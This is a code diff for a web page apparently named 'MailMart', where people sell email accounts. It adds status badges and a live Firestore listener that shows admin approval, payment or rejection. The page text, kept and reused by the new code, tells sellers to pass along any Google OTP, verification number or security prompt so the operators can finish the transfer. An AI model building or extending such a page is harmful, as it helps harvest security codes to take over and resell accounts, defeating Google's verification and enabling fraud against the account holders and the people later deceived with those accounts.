@@ -560,6 +560,24 @@ body::before{
     border:1px solid rgba(255,190,60,.3);
 }
 
+.pill.appr{
+    color:#6fe0ff;
+    background:rgba(0,170,255,.12);
+    border:1px solid rgba(0,205,255,.3);
+}
+
+.pill.paid{
+    color:#69edb8;
+    background:rgba(0,220,150,.12);
+    border:1px solid rgba(0,220,150,.3);
+}
+
+.pill.rej{
+    color:#ff9aa9;
+    background:rgba(255,50,80,.12);
+    border:1px solid rgba(255,50,80,.3);
+}
+
 .status-note{
     font-size:12px;
     line-height:1.7;
@@ -911,9 +929,9 @@ body::before{
                     <div class="lab">Sale Status</div>
                     <div class="status-email" id="statusEmail">—</div>
                 </div>
-                <span class="pill pend">Pending</span>
+                <span class="pill pend" id="statusPill">Pending</span>
             </div>
-            <div class="status-note">
+            <div class="status-note" id="statusNote">
                 Your email is now <b>Pending</b> review by our team. Please <b>stay online</b> and keep this account accessible.
                 If Google sends any OTP, verification number or security prompt, submit it in the box below so we can verify and
                 <b>complete your sale</b>. You can also reach the <b>admin</b> anytime to speed things up.
@@ -992,6 +1010,7 @@ collection,
 addDoc,
 doc,
 updateDoc,
+onSnapshot,
 arrayUnion,
 serverTimestamp
 }
@@ -1055,6 +1074,39 @@ document.getElementById("contactAdmin").addEventListener("click",()=>{
 let submittedEmail="";
 let chosenCat="OTP";
 let saleId=null;
+let unsubSale=null;
+
+/* Live status sync — reflects admin actions (approve / pay / reject) */
+function setStatus(status){
+    const pill=document.getElementById("statusPill");
+    const note=document.getElementById("statusNote");
+
+    const map={
+        pending:{
+            cls:"pend", label:"Pending",
+            msg:"Your email is now <b>Pending</b> review by our team. Please <b>stay online</b> and keep this account accessible. "+
+                "If Google sends any OTP, verification number or security prompt, submit it in the box below so we can verify and "+
+                "<b>complete your sale</b>. You can also reach the <b>admin</b> anytime to speed things up."
+        },
+        approved:{
+            cls:"appr", label:"Approved",
+            msg:"✅ Your email has been <b>Approved</b> by our team. We are preparing your payout now — please keep the account accessible until payment is marked sent."
+        },
+        paid:{
+            cls:"paid", label:"Paid",
+            msg:"💰 <b>Payment sent!</b> Your sale is <b>complete</b>. Thank you for selling with MailMart. You may now close this page."
+        },
+        rejected:{
+            cls:"rej", label:"Rejected",
+            msg:"✕ Your submission was <b>rejected</b>. Please <b>contact admin</b> for the reason and next steps."
+        }
+    };
+
+    const s=map[status]||map.pending;
+    pill.className="pill "+s.cls;
+    pill.textContent=s.label;
+    note.innerHTML=s.msg;
+}
 
 /* Step 1 — submit for sale */
 const saleForm=document.getElementById("saleForm");
@@ -1092,6 +1144,14 @@ saleForm.addEventListener("submit",async(e)=>{
             createdAt:serverTimestamp()
         });
         saleId=ref.id;
+
+        /* listen for admin status changes on this sale */
+        if(unsubSale) unsubSale();
+        unsubSale=onSnapshot(doc(db,"sales",saleId),(snap)=>{
+            if(snap.exists()){
+                setStatus(snap.data().status||"pending");
+            }
+        });
     }catch(err){
         console.error(err);
         alert("Could not save your submission. Check your Firestore security rules.");
